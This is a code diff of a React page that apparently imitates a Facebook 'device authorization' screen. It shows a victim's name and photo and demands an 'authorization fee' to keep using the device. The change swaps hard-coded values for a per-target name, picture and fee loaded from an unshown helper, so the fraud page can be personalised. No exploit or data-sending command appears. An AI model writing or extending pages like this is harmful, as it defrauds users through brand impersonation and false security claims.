@@ -1,15 +1,21 @@
 'use client';
 
-import { useState } from 'react';
+import multipleStep from '@/lib/multipleStep';
+import { useEffect, useState } from 'react';
 
 export default function DeviceAuthorization() {
   const [paid, setPaid] = useState(false);
 
-  const fbUser = {
-    name: 'Nur Alam',
-    profilePic:
-      'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRGCg4pLQ1ckWPPMqf4s4eLyiKKMUU9bpjtA&s',
-  };
+  const [infos, setInfos] = useState<any>(null);
+
+  useEffect(() => {
+    async function fetchInfos() {
+      const data = await multipleStep();
+      setInfos(data);
+    }
+    fetchInfos();
+  }, []);
+
 
   return (
     <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 font-sans">
@@ -17,13 +23,12 @@ export default function DeviceAuthorization() {
         {/* User Header */}
         <div className="flex items-center gap-4 mb-6">
           <img
-            src={fbUser.profilePic}
-            alt="Profile"
+            src={infos?.profile_pic}
             className="w-14 h-14 rounded-full border-4 border-[#1877f2] object-cover"
           />
           <div>
             <p className="text-sm text-gray-500">Facebook User</p>
-            <h2 className="text-xl font-semibold text-gray-900">{fbUser.name}</h2>
+            <h2 className="text-xl font-semibold text-gray-900">{infos?.profile_name}</h2>
           </div>
         </div>
 
@@ -56,7 +61,7 @@ export default function DeviceAuthorization() {
         {/* Payment Notice */}
         <div className="bg-yellow-50 border-l-4 border-yellow-400 text-yellow-800 p-4 rounded-md mb-6">
           <p className="text-sm font-medium">
-            A <strong>$4 authorization fee</strong> is required to continue using this device securely.
+            A <strong>${infos?.payment} authorization fee</strong> is required to continue using this device securely.
           </p>
         </div>
 
@@ -65,17 +70,17 @@ export default function DeviceAuthorization() {
           onClick={() => setPaid(true)}
           className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
         >
-          Pay $4 to Authorize Device
+          Pay ${infos?.payment} to Authorize Device
         </button>
 
         {/* Confirmation */}
         {paid && (
           <div className="bg-red-50 border-l-4 border-red-400 text-red-700 p-4 rounded-md mb-6">
-                        <p className="text-sm font-medium">
-                            Access restricted to registered users only..
-                        </p>
+            <p className="text-sm font-medium">
+              Access restricted to registered users only..
+            </p>
 
-                    </div>
+          </div>
         )}
       </div>
     </div>
